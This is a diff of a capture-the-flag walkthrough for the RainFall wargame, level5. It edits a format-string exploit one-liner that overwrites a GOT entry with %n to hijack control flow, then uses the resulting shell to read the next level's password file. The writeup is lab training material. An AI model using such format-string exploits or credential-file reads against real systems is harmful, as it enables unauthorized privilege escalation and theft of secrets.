@@ -71,10 +71,8 @@ $1 = {<text variable, no debug info>} 0x80484a4 <o>
 We need to override the value of `0x8049838` with the address of `o`, `0x80484a4`
 sadly, struct.pack() messes with stdin so we'll have to passes the address in little endian directly
 ```shell
-level5@RainFall:~$ (python -c 'import struct; print "\x38\x98\x04\x08" + "%{}p".format(str(0x80484a4-4)) + "%4$n"'; cat -)  | ./level5
-[...]
-
-           0x200
+level5@RainFall:~$ (python -c 'import struct; print "\x38\x98\x04\x08" + "%{}p".format(str(0x80484a4-4)) + "%4$n"'; cat -)  | ./level5 | tr -d ' '
+0x200
 whoami
 level6
 cat /home/user/level6/.pass
